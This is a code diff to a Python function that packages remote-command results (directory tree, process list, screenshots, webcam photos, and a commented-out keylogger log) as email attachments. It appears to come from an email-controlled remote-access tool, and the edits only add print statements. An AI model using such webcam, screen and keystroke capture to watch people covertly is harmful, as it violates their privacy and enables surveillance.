@@ -176,11 +176,13 @@ def function(msg):
                     'utf-8'), Name="directory_tree.txt", _subtype="txt")
                 attachment.add_header(
                     'Content-Disposition', 'attachment', filename="directory_tree.txt")
+                print("Directory tree")
                 res.attach(attachment)
 
             # elif func[0] == "Key logger":
             #     attachment = MIMEApplication(result.encode('utf-8'), Name="key_logger.log", _subtype="log")
             #     attachment.add_header('Content-Disposition', 'attachment', filename="key_logger.log")
+            #     print("key logger") 
             #     res.attach(attachment)
 
             elif func[0] == "Application/Process":
@@ -188,6 +190,7 @@ def function(msg):
                     'utf-8'), Name="app_process.txt", _subtype="txt")
                 attachment.add_header(
                     'Content-Disposition', 'attachment', filename="app_process.txt")
+                print("Application/process")
                 res.attach(attachment)
 
             else:
@@ -208,15 +211,17 @@ def function(msg):
                 # attach picture
                 result.add_header('Content-Disposition',
                                   'attachment', filename='screenshot.png')
+                print("Capture screen")
                 res.attach(result)
 
             elif func[0] == "Capture webcam":
                 # annouce to mail
-                text = "</br><b>Capture webcam</b>" + "Picture has been capture"
+                text = "</br><b>Capture webcam:</b>" + "Picture has been capture"
                 res.attach(MIMEText(text.encode('utf-8'), 'html', 'utf-8'))
                 # attach picture
                 result.add_header('Content-Disposition',
                                   'attachment', filename='webcam_image.png')
+                print("Capture webcam")
                 res.attach(result)
 
     return res
